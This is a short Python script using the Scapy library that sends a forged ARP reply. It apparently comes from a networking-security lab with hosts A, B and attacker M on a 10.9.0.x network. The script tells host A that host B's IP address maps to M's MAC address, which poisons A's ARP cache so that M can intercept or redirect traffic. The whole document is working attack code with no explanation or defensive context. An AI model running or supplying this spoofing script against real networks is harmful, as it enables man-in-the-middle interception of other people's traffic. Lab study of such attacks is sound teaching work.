from scapy.all import *
E = Ether()
E.dst = '02:42:0a:09:00:05' # Ethernet Destination Address is A's MAC Address
A = ARP()
A.hwsrc = '02:42:0a:09:00:69' # ARP Source MAC Address is M's MAC Address
A.psrc = '10.9.0.6' # ARP Source IP Address is B's IP Address (spoofed)
A.hwdst = '02:42:0a:09:00:05' # ARP Destination MAC Address is A's MAC Address (because it is a reply packet)
A.pdst = '10.9.0.5' # ARP Destination IP Address is A's IP Address
A.op = 2     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)